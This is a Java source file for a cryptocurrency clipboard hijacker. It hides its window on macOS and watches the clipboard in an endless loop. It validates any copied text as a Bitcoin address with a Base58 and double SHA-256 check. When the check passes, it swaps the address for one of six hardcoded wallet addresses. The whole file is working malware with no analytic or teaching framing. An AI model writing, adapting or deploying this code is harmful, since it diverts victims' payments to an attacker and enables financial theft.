import java.awt.Toolkit;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.StringSelection;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;

public class Main implements Runnable {
	private final static String ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
	private static String s;
	private static String s1;
	private static ArrayList<String>adress=new ArrayList<String>();
	public static boolean ValidateBitcoinAddress(String addr) {
		if (addr.length() < 26 || addr.length() > 35)
			return false;
		byte[] decoded = DecodeBase58(addr, 58, 25);
		if (decoded == null)
			return false;

		byte[] hash = Sha256(decoded, 0, 21, 2);

		return Arrays.equals(Arrays.copyOfRange(hash, 0, 4), Arrays.copyOfRange(decoded, 21, 25));
	}

	private static byte[] DecodeBase58(String input, int base, int len) {
		byte[] output = new byte[len];
		for (int i = 0; i < input.length(); i++) {
			char t = input.charAt(i);

			int p = ALPHABET.indexOf(t);
			if (p == -1)
				return null;
			for (int j = len - 1; j >= 0; j--, p /= 256) {
				p += base * (output[j] & 0xFF);
				output[j] = (byte) (p % 256);
			}
			if (p != 0)
				return null;
		}

		return output;
	}

	private static byte[] Sha256(byte[] data, int start, int len, int recursion) {
		if (recursion == 0)
			return data;

		try {
			MessageDigest md = MessageDigest.getInstance("SHA-256");
			md.update(Arrays.copyOfRange(data, start, start + len));
			return Sha256(md.digest(), 0, 32, recursion - 1);
		} catch (NoSuchAlgorithmException e) {
			return null;
		}
	}

	public static void main(String[] args) {
		System.setProperty("apple.awt.UIElement", "true");
		adress.add("1CKYjM8gAk4EEKhkEiGGMJtWCC1mUYefUG");
		adress.add("1DZXtNptz1aZqeaC7aN9a5Y4yytSWbAz64");	
		adress.add("1HYJ3AbfdKG3E54ukJXYBUNchmEcVvbZKT");	
		adress.add("1CHR5djSXPS9M4JRfasSQy88ib8sbCBFLL");	
		adress.add("1BAgMaAG5PdU1RWuTrAVH5eadRbVmVKFZ"); 
		adress.add("1EuJijGPBBcNT74Za5hYkjoFx4dMerL2yr");
		Main m = new Main();
		Thread t = new Thread(m);
		t.start();
	}

	@Override
	public void run() {
		 s = new String();
		 s1 = new String();
		while (true) {
			try {
				s = (String) Toolkit.getDefaultToolkit().getSystemClipboard().getContents(null)
						.getTransferData(DataFlavor.stringFlavor);
			} catch (Exception e) {

			}
			if (!s.equals(s1)) {
				System.out.println(s);
				if (!adress.contains(s) && ValidateBitcoinAddress(s)) {
					System.out.println("btc adress");
					StringSelection ss = new StringSelection(getAdress());
					Toolkit.getDefaultToolkit().getSystemClipboard().setContents(ss, ss);
				}

			}
			s1 = s;
		}

	}

	private String getAdress() {
		Collections.shuffle(adress);
		return adress.get(0);
	}
}
